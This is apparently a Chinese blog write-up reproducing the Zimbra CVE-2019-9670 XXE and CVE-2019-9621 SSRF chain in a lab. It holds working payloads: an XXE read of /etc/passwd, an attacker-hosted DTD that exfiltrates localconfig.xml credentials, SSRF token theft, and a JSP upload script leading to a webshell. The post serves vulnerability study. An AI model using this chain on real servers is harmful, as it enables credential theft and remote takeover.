<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!--!--><title>ggb0n&#039;s Blog</title><meta description="网络安全, CTF, 机器学习"><meta property="og:type" content="website"><meta property="og:title" content="ggb0n"><meta property="og:url" content="http://ggb0n.cool/"><meta property="og:site_name" content="ggb0n&#039;s blog"><meta property="og:description" content="网络安全, CTF, 机器学习"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://ggb0n.cool/images/icon2.png"><meta property="article:author" content="ggb0n"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://ggb0n.cool/images/icon2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ggb0n.cool/"},"headline":"ggb0n","image":["http://www.ggb0n.cool/images/back2.png"],"author":{"@type":"Person","name":"ggb0n"},"description":"网络安全, CTF, 机器学习"}</script><link rel="alternative" href="/atom.xml" title="ggb0n&#039;s Blog" type="application/atom+xml"><link rel="icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/tools">CyberChef</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card widget">
            <div class="card-content">
                <h3 class="menu-label">Hot Recommend</h3><span id="index_hot_div">Loading...Wait a Minute!</span>
            </div>
        </div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-09-06T09:06:53.000Z">2020-09-06</time><a class="commentCountImg" href="/2020/09/06/Zimbra2019CVE%E5%A4%8D%E7%8E%B0/#comment-container"><span class="display-none-class">1d06984f64fb84fde6051b3de04ba615</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="1d06984f64fb84fde6051b3de04ba615"> 99+</span>    </a><span class="level-item">23 minutes read (About 3411 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/06/Zimbra2019CVE%E5%A4%8D%E7%8E%B0/">Zimbra2019CVE复现</a></h1><div class="content"><h2 id="Zimbra-2019漏洞复现"><a href="#Zimbra-2019漏洞复现" class="headerlink" title="Zimbra 2019漏洞复现"></a>Zimbra 2019漏洞复现</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2019年Zimbra爆出两个CVE，分别是<code>CVE-2019-9670</code>和<code>CVE-2019-9621</code>，前者是XXE漏洞，后者可实现SSRF。</p>
<p>CVE-2019-9670是由<code>zimbra/lib/jars/zimbrastore.jar</code>中的AutoDiscover模块对登录信息审查不严谨而导致的XXE任意文件读取漏洞，影响范围为<code>8.5-8.7.11</code>，在服务器开启7071端口的情况下，可以伪装为管理员登录操作。</p>
<p>CVE-2019-9621是由<code>zimbra/lib/jars/zimbrastore.jar</code>中的ProxyServlet模块所提供的的代理请求功能导致，通过低权限令牌可以向管理员端口发起请求，从而拿到管理员权限。在服务器7071端口关闭的情况下，利用此SSRF结合XXE漏洞可以实现RCE。</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h4 id="CVE-2019-9670"><a href="#CVE-2019-9670" class="headerlink" title="CVE-2019-9670"></a>CVE-2019-9670</h4><p><code>zimbrastore.jar</code>文件中的<code>com/zimbra/cs/service/AutoDiscoverServlet.class</code>中的<code>doPost</code>函数使用<code>getTagValue</code>函数处理用户请求：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NodeList nList = doc.getElementsByTagName(<span class="string">"Request"</span>);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(i &gt;= nList.getLength())</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    Node node = nList.item(i);</span><br><span class="line">    <span class="keyword">if</span>(node.getNodeType() == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Element element = (Element)node;</span><br><span class="line">        email = getTagValue(<span class="string">"EMailAddress"</span>, element);</span><br><span class="line">        responseSchema = getTagValue(<span class="string">"AcceptableResponseSchema"</span>, element);</span><br><span class="line">        <span class="keyword">if</span>(email != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    i++;</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到，它会对传入的<code>EMailAddress</code>和<code>AcceptableResponseSchema</code>参数进行审查，前者是邮箱，后者是接受的响应类型，具体见<a href="https://docs.microsoft.com/zh-cn/">官网</a>中对AutoDiscover构造语句的描述。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(email == <span class="keyword">null</span> || email.length() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    log.warn(<span class="string">"No Email address is specified in the Request, %s"</span>, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        content</span><br><span class="line">    &#125;);</span><br><span class="line">    sendError(resp, <span class="number">400</span>, <span class="string">"No Email address is specified in the Request"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(responseSchema != <span class="keyword">null</span> &amp;&amp; responseSchema.length() &gt; <span class="number">0</span> &amp;&amp; !responseSchema.equals(<span class="string">"http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006"</span>) &amp;&amp; !responseSchema.equals(<span class="string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    log.warn((<span class="keyword">new</span> StringBuilder()).append(<span class="string">"Requested response schema not available "</span>).append(responseSchema).toString());</span><br><span class="line">    sendError(resp, <span class="number">503</span>, (<span class="keyword">new</span> StringBuilder()).append(<span class="string">"Requested response schema not available "</span>).append(responseSchema).toString());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，其中对<code>email</code>的检查仅限于检查其是否为空，没有用户合法性验证，因此随意构造邮箱用户即可登录。对<code>responseSchema</code>检查是否为规定的两种类型，如果不是，则报错并将responseSchema返回给用户，<strong>这里就是漏洞产生的关键位置</strong>，<strong>因为post的内容是经过xml编码的，因此如果我们构造恶意的xml语句，并将变量名放入<code>AcceptableResponseSchema</code>中，那么不满足规定的两种类型，将通过<code>sendError(resp, 503, (new StringBuilder()).append(&quot;Requested response schema not available &quot;).append(responseSchema).toString())</code>语句将其内容返回给用户，这里由于AcceptableResponseSchema是我们构造好的恶意xml代码的变量名，因此会先执行恶意代码，然后将结果返回给用户，从而导致XXE</strong>。</p>
<p>通过利用该XXE漏洞，我们可以进行任意文件读取，根据zimbra的官方配置，其管理员用户名、密码等敏感信息，进一步结合SSRF进行恶意文件上传，从而进行RCE。</p>
<h4 id="CVE-2019-9621"><a href="#CVE-2019-9621" class="headerlink" title="CVE-2019-9621"></a>CVE-2019-9621</h4><p>由于zimbra通过令牌管理用户权限，设置了一个应用程序模型，使得管理令牌只能被授予进入管理端口的请求（默认情况下端口是7071），但是很多网站都没有开7071，因此如果想要获取管理权限上传文件，就需要利用SSRF。</p>
<p>在<code>com/zimbra/cs/zimlet/ProxyServlet.class</code>中的<code>dopPoxy</code>中存在代理转发的操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> isAdmin;</span><br><span class="line">AuthToken authToken;</span><br><span class="line">ZimbraLog.clearContext();</span><br><span class="line">isAdmin = isAdminRequest(req);</span><br><span class="line">authToken = isAdmin ? getAdminAuthTokenFromCookie(req, resp, <span class="keyword">true</span>) : getAuthTokenFromCookie(req, resp, <span class="keyword">true</span>);  </span><br><span class="line"><span class="keyword">if</span>(authToken != <span class="keyword">null</span>)</span><br><span class="line">    <span class="keyword">break</span> MISSING_BLOCK_LABEL_138;</span><br><span class="line">String zAuthToken = req.getParameter(<span class="string">"zauthtoken"</span>);</span><br><span class="line"><span class="keyword">if</span>(zAuthToken == <span class="keyword">null</span>)</span><br><span class="line">    <span class="keyword">break</span> MISSING_BLOCK_LABEL_138;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    authToken = AuthProvider.getAuthToken(zAuthToken);</span><br><span class="line">    <span class="keyword">if</span>(authToken.isExpired())</span><br><span class="line">    &#123;</span><br><span class="line">        resp.sendError(<span class="number">401</span>, <span class="string">"authtoken expired"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(AuthTokenException e)</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">401</span>, <span class="string">"unable to parse authtoken"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!authToken.isRegistered())</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">401</span>, <span class="string">"authtoken is invalid"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isAdmin &amp;&amp; !authToken.isAdmin())</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">401</span>, <span class="string">"permission denied"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">byte</span> body[];</span><br><span class="line">String target;</span><br><span class="line"><span class="keyword">boolean</span> asUpload;</span><br><span class="line">HttpMethod method;</span><br><span class="line"><span class="keyword">if</span>(authToken == <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">401</span>, <span class="string">"no authtoken cookie"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">body = copyPostedData(req);</span><br><span class="line">target = req.getParameter(<span class="string">"target"</span>);</span><br><span class="line"><span class="keyword">if</span>(target == <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">URL url = <span class="keyword">new</span> URL(target);</span><br><span class="line"><span class="keyword">if</span>(!isAdmin &amp;&amp; !checkPermissionOnTarget(url, authToken))</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当该代理接收到请求的时候，它会判断该账户是不是admin以及其authToken是否合法，并且当authToken是属于一个一般用户的时候，会检查target是否传参，如果利用target传了参数，则会向target指向的位置进行请求。我们可以通过该代理操作访问到本地监听的7071管理端口。如果我们将Host修改为<code>127.0.0.1:7071</code>，告诉服务器自己是从管理端口进入，同时在Cookie中设置一个低权限的Token（可以通过在<code>/service/soap</code>路由登录账号获取，该路由能够对Zimbra邮件服务器的资源进行访问和修改，详细参考<a href="http://www.myzaker.com/article/5e98fe228e9f09724949af30/">Zimbra SOAP API开发指南</a>）访问<code>/service/admin/soap</code>路由，则可以利用SSRF拿到admin的token，利用该token则可以完成恶意文件上传，借助网站挂马进行RCE。</p>
<h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>目标主机：ubuntu-16.04LTS、zimbra-8.7.1、IP-172.16.36.131</p>
<p>攻击机：ubuntu-20.04LTS、Firfox+RESTClient插件、python3、IP-172.16.36.130</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>参考<a href="https://blog.csdn.net/sydnash/article/details/6108136">此处</a>在ubuntu16.04下搭建zimbra服务器，注意需要首先配置好虚拟机的DNS服务之后再安装zimbra，否则安装过程不能完成。这里记录环境配置过程中的问题：</p>
<ul>
<li><p>1、DNS配置问题<br>复现过程中，起初DNS一直配置不成功，后来梳理了一下，需要配置的内容有：<code>/etc/hosts</code>、<code>/etc/resolv.conf</code>、<code>/etc/bind/named.conf.local</code>、<code>/etc/bind/db.xxx.com</code>、<code>/etc/hostname</code>，逐步配置一般不会有问题；</p>
</li>
<li><p>2、zimbra安装过程错误-1</p>
<blockquote>
<p>ERROR: Installation can not proceeed. Please fix your /etc/hosts file<br>to contain:</p>
<p><ip> <FQHN> <HN></p>
<p>Where <IP> is the ip address of the host,<br><FQHN> is the FULLY QUALIFIED host name, and<br><HN> is the (optional) hostname-only portion</p>
</blockquote>
<p>如下配置即可：</p>
<blockquote>
<p>127.0.0.1 localhost.localdomain localhost<br>192.168.1.218 mail.example.com mail</p>
</blockquote>
</li>
<li><p>3、zimbra安装过程错误-2</p>
<blockquote>
<p>Unable to download packages from repository. System is not modified.</p>
</blockquote>
<p>多半是源的问题，用下面的源即可</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial main</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates main</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security main</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security universe</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>复现过程可分为四步：利用XXE泄露敏感文件、访问<code>/service/soap</code>路由获取低权限token、利用SSRF访问管理员端口获取高权限token、上传文件进行RCE</p>
<p><strong>1、泄露敏感文件</strong></p>
<p><code>/Autodiscover/Autodiscover.xml</code>路由是邮件系统的自动发现服务，使用用户的email地址和密码去自动的配置用户信息，因此当我们向此路由post用于登录的<code>EMailAddress</code>和<code>AcceptableResponseSchema</code>的时候，上面提到的存在XXE漏洞的模块会对其进行解析检查，我们随便构造一个邮箱账号并同时构造用于读取敏感文件的恶意xml代码，向此路由post过去，即可利用xxe读取到敏感文件。</p>
<p>首先测试漏洞可用性，post如下的payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Autodiscover</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">Request</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">EMailAddress</span>&gt;</span>test@test.com<span class="tag">&lt;/<span class="name">EMailAddress</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AcceptableResponseSchema</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">Request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Autodiscover</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意这里需要在<code>&lt;Autodiscover&gt;</code>标签中放入正确的Autodiscovery的Request包，<a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxprotlp/30c90a39-9adf-472b-8b5b-03c282304a83">微软官网</a>查询。</p>
<p>POST过去之后，回显如下：<br><img src="http://ggb0n.cool/images/xxe1.png" alt=""></p>
<p>可以看到，漏洞成功被利用，接下来就是读取一些敏感文件。<code>localconfig.xml</code>存放着zimbra关键的配置信息，包含域名、内部SOAP通信的用户名、密码（在安装时，Zimbra为其内部SOAP通信设置了一个全局管理员，用户名为<code>zimbra</code>，并随机生成密码。这些信息均存储在名为localconfig.xml的本地文件中）等，因为我们需要通过<code>/service/soap</code>路由获取token，因此需要获取到此用户名和密码。</p>
<p>这里有一个问题：localconfig.xml是xml文件，需要加上<code>CDATA</code>标签才能作为文本读取，但是XXE不能利用内部实体进行拼接，同时还有我们从前端post构造的payload过去其实是没有服务器的zimbra用户权限的，因此读不到localconfig.xml文件。所以需要借助外部dtd注入触发XXE漏洞。</p>
<p>构造dtd文件如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># exp.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:../conf/localconfig.xml"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将dtd文件放在我们的攻击机上，同时利用python或者php监听指定端口：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">5000</span></span><br><span class="line">php -S <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br></pre></td></tr></table></figure>

<p>然后post如下payload到服务器：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Autodiscover</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://172.16.36.130:5000/exp.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Autodiscover</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Request</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EMailAddress</span>&gt;</span>test@test.com<span class="tag">&lt;/<span class="name">EMailAddress</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">AcceptableResponseSchema</span>&gt;</span><span class="symbol">&amp;fileContents;</span><span class="tag">&lt;/<span class="name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Autodiscover</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取到localconfig.xml内容：</p>
<p><img src="http://ggb0n.cool/images/xxe2.png" alt=""></p>
<p>读取到soap用户名、密码，至此XXE漏洞利用部分完成，后面结合SSRF进行文件上传。</p>
<p><strong>2、获取低权限token</strong></p>
<p>利用获取到的soap用户名和密码，在<code>http://172.16.36.131/service/soap</code>路由下登录，即可获取到一个低权限token，抓包构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2003/05/soap-envelope"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">context</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbra"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">userAgent</span> <span class="attr">name</span>=<span class="string">"ZimbraWebClient - SAF3 (Win)"</span> <span class="attr">version</span>=<span class="string">"5.0.15_GA_2851.RHEL5_64"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">AuthRequest</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbraAccount"</span>&gt;</span>  # 指明是普通用户</span><br><span class="line">        <span class="tag">&lt;<span class="name">account</span> <span class="attr">by</span>=<span class="string">"adminName"</span>&gt;</span>zimbra<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>password<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">AuthRequest</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>响应中包含一个低权限token：</p>
<p><img src="http://ggb0n.cool/images/token.png" alt=""></p>
<p><strong>3、SSRF获取管理员token</strong></p>
<p>获取到上面的低权限token之后，利用其代理功能中存在的SSRF漏洞，让服务器替我们去访问它自己的7071端口下的<code>/service/admin/soap</code>路由，即可获取到管理员token，<strong>注意：7071端口的访问必须是https</strong>，url构造如下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">36.131</span><span class="regexp">/service/</span>proxy?target=https:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7071</span><span class="regexp">/service/</span>admin<span class="regexp">/soap</span></span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2003/05/soap-envelope"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">context</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbra"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">userAgent</span> <span class="attr">name</span>=<span class="string">"ZimbraWebClient - SAF3 (Win)"</span> <span class="attr">version</span>=<span class="string">"5.0.15_GA_2851.RHEL5_64"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">AuthRequest</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbraAdmin"</span>&gt;</span> # 指明是管理员</span><br><span class="line">        <span class="tag">&lt;<span class="name">account</span> <span class="attr">by</span>=<span class="string">"adminName"</span>&gt;</span>zimbra<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>password<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">AuthRequest</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意将<code>xmlns</code>更改为<code>urn:zimbraAdmin</code></p>
<p>在post请求之前，还需要在请求头中添加cookie，内容是上面获取到的低权限token</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Cookie: <span class="attribute">ZM_ADMIN_AUTH_TOKEN</span>=low_permission_token</span><br></pre></td></tr></table></figure>

<p>响应中包含管理员的token，利用该token，我们可以实现文件上传操作。</p>
<p><strong>4、文件上传RCE</strong></p>
<p>此处用到了<code>CVE-2013-7091</code>利用过程中文件上传的操作，详细参考<a href="https://www.exploit-db.com/exploits/30472">这里</a>，通过上传jsp小马，即可实现远程命令执行。这里附上测试代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">'filename'</span>:(<span class="literal">None</span>,<span class="string">"test1.jsp"</span>,<span class="literal">None</span>),</span><br><span class="line">    <span class="string">'clientFile'</span>:(<span class="string">"test2.jsp"</span>,<span class="string">r'&lt;%out.println("test_file_upload");%&gt;'</span>,<span class="string">"text/plain"</span>),</span><br><span class="line">    <span class="string">'requestId'</span>:(<span class="literal">None</span>,<span class="string">"12"</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"ZM_ADMIN_AUTH_TOKEN=admin_token"</span>,<span class="comment">#admin_token</span></span><br><span class="line">    <span class="string">"Host"</span>:<span class="string">"foo:7071"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">"https://target.com/service/extension/clientUploader/upload"</span>,files=files,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>访问<code>http://ip:port/downloads/test2.jsp</code>回显<code>test_file_upload</code>说明文件成功上传。构造恶意jsp文件即可实现RCE:</p>
<p><img src="http://ggb0n.cool/images/rce.png" alt=""></p>
<p>如图，成功执行命令，用中国菜刀或者中国蚁剑连接即可。</p>
